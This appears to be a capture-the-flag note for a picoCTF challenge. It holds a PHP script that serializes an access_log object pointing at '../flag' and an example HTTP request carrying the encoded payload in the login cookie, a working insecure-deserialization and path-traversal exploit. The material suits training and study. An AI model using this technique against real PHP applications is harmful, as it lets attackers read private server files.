# CTF PHP Script

```
<?php
class access_log
{
	public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log))))
?>
```
**Encoding tools: https://onlinephp.io/**
Base64 encoded script used on header cookies at login=

## Example Header

```
GET /authentication.php HTTP/1.1
Host: mercury.picoctf.net:8404
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=bp4u2a2bb3tkdc0aano77ub69g; login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
Upgrade-Insecure-Requests: 1
```
